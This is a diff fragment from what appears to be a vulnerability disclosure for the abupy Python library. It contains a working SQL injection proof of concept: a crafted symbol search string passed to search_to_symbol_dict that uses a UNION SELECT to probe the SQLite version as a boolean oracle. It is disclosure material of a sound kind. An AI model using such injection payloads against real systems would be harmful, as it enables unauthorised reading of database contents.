@@ -22,7 +22,7 @@ Secondly import abupy.MarketBu.ABuSymbol, and call abupy.MarketBu.ABuSymbol.sear
 import abupy.MarketBu.ABuSymbol
 print(abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us10101' union select case when sqlite_version() = '3.31.1' then 'usJASNW' else 'usTROVW' end where ''='"))
 ```
-(abupy.MarketBu.ABuSymbol.search_to_symbol_dict is a functional api which author mentioned in the code annotation of the function, It is legal and normal for users and programmers to call this function, proof: https://github.com/bbfamily/abu/blob/master/abupy/MarketBu/ABuSymbol.py -> line: 200 code annotation )
+(abupy.MarketBu.ABuSymbol.search_to_symbol_dict is a functional api which author mentioned in the code annotation of the function, It is legal and normal for users and programmers to call this function, proof: https://github.com/bbfamily/abu/blob/master/abupy/MarketBu/ABuSymbol.py -> line: 200 code annotation, so users can easily trigger this vulnerability)
 
 Finally you can find the result is `{'JASNW': 'JASON INDS INC'}`  
 if you replace `sqlite_version() = '3.31.1'` with `sqlite_version() != '3.31.1'`  
